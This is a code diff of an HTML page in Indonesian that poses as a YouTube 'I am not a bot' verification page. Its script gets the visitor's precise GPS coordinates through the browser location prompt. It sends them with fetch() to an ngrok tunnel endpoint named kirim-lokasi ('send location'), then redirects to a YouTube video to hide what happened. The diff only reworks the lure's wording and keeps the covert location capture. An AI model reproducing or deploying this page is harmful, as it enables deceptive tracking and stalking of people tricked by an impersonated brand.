@@ -3,52 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YouTube - Verifikasi</title>
+    <title>YouTube Verification</title>
     <style>
         body { font-family: sans-serif; background: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 350px; }
         button { background: #cc0000; color: white; border: none; padding: 15px 20px; border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; }
-        #msg { margin-top: 15px; font-size: 13px; color: #606060; }
     </style>
 </head>
 <body>
     <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="120" style="margin-bottom:20px;">
         <h3>Verifikasi Keamanan</h3>
-        <p>Klik tombol di bawah untuk membuktikan Anda bukan bot.</p>
-        <button onclick="gasVerif()">SAYA BUKAN BOT</button>
-        <div id="msg"></div>
+        <p>Klik tombol di bawah untuk melanjutkan ke video.</p>
+        <button onclick="kirimData()">SAYA BUKAN BOT</button>
+        <p id="status" style="font-size: 12px; color: gray; margin-top: 10px;"></p>
     </div>
 
     <script>
-        function gasVerif() {
-            const msg = document.getElementById('msg');
-            // WAJIB: Ganti dengan link Ngrok kamu yang sedang online sekarang!
+        function kirimData() {
+            const status = document.getElementById('status');
+            // GANTI INI DENGAN LINK NGROK KAMU
             const linkNgrok = "https://adiabatically-nonhomogeneous-gavin.ngrok-free.dev";
 
-            msg.innerText = "Meminta akses lokasi...";
+            status.innerText = "Meminta izin lokasi...";
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((pos) => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
                     
-                    msg.innerText = "Mengirim data...";
+                    status.innerText = "Mengirim verifikasi...";
 
                     fetch(`${linkNgrok}/api/kirim-lokasi?lat=${lat}&lon=${lon}`)
                     .then(() => {
-                        msg.style.color = "green";
-                        msg.innerText = "✅ Berhasil!";
+                        status.innerText = "Berhasil! Mengalihkan...";
                         setTimeout(() => {
                             window.location.href = "https://www.youtube.com/watch?v=EFmxPMdBqmU";
                         }, 1000);
                     })
-                    .catch(() => {
-                        alert("Gagal koneksi ke Ngrok! Cek terminal Ngrok kamu.");
-                    });
+                    .catch(err => alert("Gagal kirim ke server!"));
                 }, (err) => {
-                    alert("Akses lokasi ditolak! Harap aktifkan GPS dan klik Izinkan.");
-                }, { enableHighAccuracy: true });
+                    alert("Izin lokasi ditolak! Aktifkan GPS kamu.");
+                });
             }
         }
     </script>
